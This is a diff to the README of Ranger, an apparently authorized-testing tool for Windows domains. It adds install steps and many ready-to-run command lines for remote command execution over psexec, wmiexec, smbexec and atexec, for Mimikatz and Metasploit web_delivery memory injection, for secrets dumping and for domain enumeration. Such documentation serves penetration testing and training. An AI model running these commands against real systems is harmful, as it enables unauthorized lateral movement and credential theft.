@@ -18,54 +18,136 @@ professionals doing legally and/or contractually supported activities.
 More functionality is being added, but at this time the tool uses the community contributions 
 from repositories related to the PowerShell PowerView, PowerShell Mimikatz and Impacket teams.
 
+## Managing Ranger
+### Install
+```
+wget https://raw.githubusercontent.com/funkandwagnalls/ranger/master/setup.sh
+chmod a+x setup.sh
+./setup.sh
+rm setup.sh
+```
+### Update
+```
+ranger --update
+```
+
+## Usage
+* Ranger uses a combination of methods and attacks, a method is used to deliver an attack/command
+* An attack is what you are trying to accomplish
+* Some items are both a method and attack rolled into one and some methods cannot use some of the attacks due to current limitations in the libraries or protocols
+
+### Methods & Attacks
+```
+--scout
+--secrets-dump
+```
+### Method
+```
+--wmiexec
+--psexec
+--atexec
+```
+### Attack
+```
+--command
+--invoker
+--downloader
+--executor
+--domain-group-members
+--local-group-members
+--get-domain-membership
+--get-forest-domains
+--get-forest
+--get-dc
+--find-la-access
+```
+
 ##Command Execution:
 ###Find Logged In Users:
+```
 ranger.py [-u Administrator] [-p Password1] [-d Domain] --scout
-
+```
 ###SMBEXEC Command Shell:
+```
 ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --smbexec -q -v -vv -vvv
+```
 
 ###PSEXEC Command Shell:
+```
 ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --psexec -q -v -vv -vvv
+```
 
 ###PSEXEC Command Execution:
+```
 ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --psexec -c "Net User" -q -v -vv -vvv
+```
 
 ###WMIEXEC Command Execution:
+```
 ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec -c "Net User"
+```
 
 ###WMIEXEC PowerShell Mimikatz Memory Injector:
+```
 ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --invoker
+```
 
 ###WMIEXEC Metasploit web_delivery Memory Injector (requires Metasploit config see below):
+```
 ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --downloader
+```
 
 ###WMIEXEC Custom Code Memory Injector:
+```
 ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --executor -c "binary.exe"
+```
 
 ###ATEXEC Command Execution:
+```
 ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --atexec -c "Net User" --no-encoder
+```
 
 ###ATEXEC PowerShell Mimikatz Memory Injector:
+```
 ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --invoker --no-encoder
+```
 
 ###ATEXEC Metasploit web_delivery Memory Injector (requires Metasploit config see below):
+```
 ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --downloader --no-encoder
+```
 
 ###ATEXEC Custom Code Memory Injector:
+```
 ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --executor -c "binary.exe" --no-encoder
+```
 
 ###SECRETSDUMP Custom Code Memory Injector:
+```
 ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --secrets-dump
+```
 
 ###Create Pasteable Mimikatz Attack:
+```
 ranger.py --invoker -q -v -vv -vvv
+```
 
 ###Create Pasteable web_delivery Attack (requires Metasploit config see below):
+```
 ranger.py --downloader -q -v -vv -vvv
+```
 
 ###Create Pasteable Executor Attack:
+```
 ranger.py --executor -q -v -vv -vvv
+```
+### Identifying Groups Members and Domains
+* When identifying groups make sure to determine what the actual query domain is with the `--get-domain-membership`
+* Then when you query a group use the optional `--domain`, which allows you to target a different domain than the one you logged into
+```
+ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --get-domain-membership
+ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --domain "Domain.local2"
+```
 
 ##Notes About Usage:
 ###Cred File Format:
